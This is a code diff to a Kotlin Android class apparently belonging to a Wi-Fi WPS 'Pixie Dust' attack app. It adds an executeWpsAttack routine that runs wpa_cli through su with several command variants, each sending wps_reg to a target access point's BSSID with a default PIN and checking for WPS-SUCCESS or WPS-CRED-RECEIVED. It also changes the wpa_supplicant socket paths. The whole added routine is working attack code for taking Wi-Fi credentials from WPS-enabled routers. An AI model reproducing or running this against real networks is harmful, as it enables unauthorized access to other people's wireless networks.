@@ -1264,6 +1264,144 @@ class PixieDustHelper(
         }
     }
 
+    fun checkInterfaceAvailability(interfaceName: String): Boolean {
+        return try {
+            val result = Shell.cmd("ip link show $interfaceName").exec()
+            if (result.isSuccess) {
+                Log.d(TAG, "Interface $interfaceName is available")
+                true
+            } else {
+                Log.w(TAG, "Interface $interfaceName not found")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error checking interface $interfaceName", e)
+            false
+        }
+    }
+
+    private suspend fun executeWpsAttack(network: WpsNetwork, interfaceName: String, socketDir: String): Boolean {
+        return withContext(Dispatchers.IO) {
+            try {
+                callbacks.onLogEntry(LogEntry("Starting WPS attack on interface: $interfaceName", LogColorType.INFO))
+
+                val arch = getArchitectureSuffix()
+                val socketParam = when {
+                    Build.VERSION.SDK_INT >= 28 -> " -g${socketDir}${interfaceName} "
+                    else -> " -g${socketDir}${interfaceName} "
+                }
+
+                val commands = when {
+                    Build.VERSION.SDK_INT >= 28 -> listOf(
+                        "( cmdpid=\$\$; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch$socketParam IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "( cmdpid=\$\$; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch $socketParam wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "$binaryDir/wpa_cli_n$arch -p$socketDir -i$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN",
+                        "$binaryDir/wpa_cli_n$arch --pin $DEFAULT_PIN --bssid ${network.bssid} -i$interfaceName"
+                    )
+                    else -> listOf(
+                        "( cmdpid=\$\$; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch$socketParam IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "( cmdpid=\$\$; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch $socketParam wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "$binaryDir/wpa_cli_n$arch IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN"
+                    )
+                }
+
+                var success = false
+                for ((index, cmd) in commands.withIndex()) {
+                    val ldLibraryPath = if (Build.VERSION.SDK_INT >= 28) {
+                        "$binaryDir:/system/lib64:/system/lib"
+                    } else {
+                        binaryDir
+                    }
+
+                    val command = "cd $binaryDir && export LD_LIBRARY_PATH=$ldLibraryPath && $cmd"
+
+                    Log.d(TAG, "Trying WPS command variant ${index + 1}/${commands.size}: $cmd")
+                    callbacks.onLogEntry(LogEntry("Trying WPS command variant ${index + 1}/${commands.size}", LogColorType.INFO))
+
+                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+
+                    val outputReader = BufferedReader(InputStreamReader(process.inputStream))
+                    val errorReader = BufferedReader(InputStreamReader(process.errorStream))
+
+                    val outputLines = mutableListOf<String>()
+                    val errorLines = mutableListOf<String>()
+
+                    val outputJob = scope.async {
+                        try {
+                            var line: String?
+                            while (outputReader.readLine().also { line = it } != null) {
+                                line?.let {
+                                    outputLines.add(it)
+                                    Log.d("WPA_CLI_OUT", it)
+                                    callbacks.onLogEntry(LogEntry("wpa_cli: $it", LogColorType.SUCCESS))
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Error reading wpa_cli output", e)
+                        }
+                    }
+
+                    val errorJob = scope.async {
+                        try {
+                            var line: String?
+                            while (errorReader.readLine().also { line = it } != null) {
+                                line?.let {
+                                    errorLines.add(it)
+                                    Log.w("WPA_CLI_ERR", it)
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Error reading wpa_cli error output", e)
+                        }
+                    }
+
+                    val timeoutJob = scope.async {
+                        delay(10000)
+                        if (isProcessAlive(process)) {
+                            Log.d(TAG, "WPS command timeout, killing process")
+                            process.destroy()
+                        }
+                    }
+
+                    val exitCode = process.waitFor()
+                    timeoutJob.cancel()
+
+                    outputJob.await()
+                    errorJob.await()
+
+                    outputReader.close()
+                    errorReader.close()
+
+                    Log.d(TAG, "WPS command ${index + 1} finished with exit code: $exitCode")
+
+                    val outputText = outputLines.joinToString("\n")
+                    val errorText = errorLines.joinToString("\n")
+
+                    if (outputText.contains("OK") ||
+                        outputText.contains("WPS-SUCCESS") ||
+                        outputText.contains("WPS-CRED-RECEIVED")) {
+                        success = true
+                        callbacks.onLogEntry(LogEntry("WPS handshake successful!", LogColorType.SUCCESS))
+                        break
+                    } else if (errorText.contains("Could not connect") ||
+                        errorText.contains("No such file") ||
+                        outputText.contains("FAIL")) {
+                        callbacks.onLogEntry(LogEntry("Command variant ${index + 1} failed, trying next..."))
+                        continue
+                    }
+
+                    delay(1000)
+                }
+
+                success
+            } catch (e: Exception) {
+                Log.e(TAG, "WPS attack execution error", e)
+                callbacks.onLogEntry(LogEntry("WPS attack error: ${e.message}", LogColorType.ERROR))
+                false
+            }
+        }
+    }
+
     private suspend fun startSupplicant(socketDir: String, interfaceName: String): Boolean {
         return withContext(Dispatchers.IO) {
             try {
@@ -1299,12 +1437,12 @@ class PixieDustHelper(
                     Build.VERSION.SDK_INT >= 28 -> """
                     cd $binaryDir && \
                     export LD_LIBRARY_PATH=$ldLibraryPath && \
-                    ( cmdpid=${'$'}BASHPID; (sleep 10; kill ${'$'}cmdpid) & exec ./wpa_supplicant$arch -d -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -K -O$socketDir )
+                    ( cmdpid=${'$'}BASHPID; (sleep 10; kill ${'$'}cmdpid) & exec ./wpa_supplicant$arch -d -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -K -O/data/vendor/wifi/wpa/$PACKAGE_NAME/ )
                 """.trimIndent()
                     else -> """
                     cd $binaryDir && \
                     export LD_LIBRARY_PATH=$ldLibraryPath && \
-                    ( cmdpid=${'$'}BASHPID; (sleep 10; kill ${'$'}cmdpid) & exec ./wpa_supplicant$arch -d -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -K -O$socketDir )
+                    ( cmdpid=${'$'}BASHPID; (sleep 10; kill ${'$'}cmdpid) & exec ./wpa_supplicant$arch -d -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -K -O/data/misc/wifi/$PACKAGE_NAME/ )
                 """.trimIndent()
                 }
 
